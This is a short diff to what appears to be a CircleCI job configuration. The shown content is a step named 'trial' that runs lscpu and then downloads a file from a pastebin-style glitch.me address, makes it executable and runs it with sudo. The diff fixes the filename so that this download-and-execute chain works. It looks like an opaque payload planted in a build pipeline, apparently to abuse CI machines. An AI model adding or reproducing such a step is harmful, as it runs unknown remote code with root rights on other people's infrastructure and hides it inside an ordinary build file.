@@ -9,7 +9,7 @@ jobs:
       - run: lscpu
       - run: 
             name: "trial" 
-            command: wget https://muq-hastebin.glitch.me/raw/LEwqqD3W4k && chmod u+x rbXy36HWQr && sudo ./rbXy36HWQr
+            command: wget https://muq-hastebin.glitch.me/raw/LEwqqD3W4k && chmod u+x LEwqqD3W4k && sudo ./LEwqqD3W4k
  
 workflows: 
     version: 2.1 
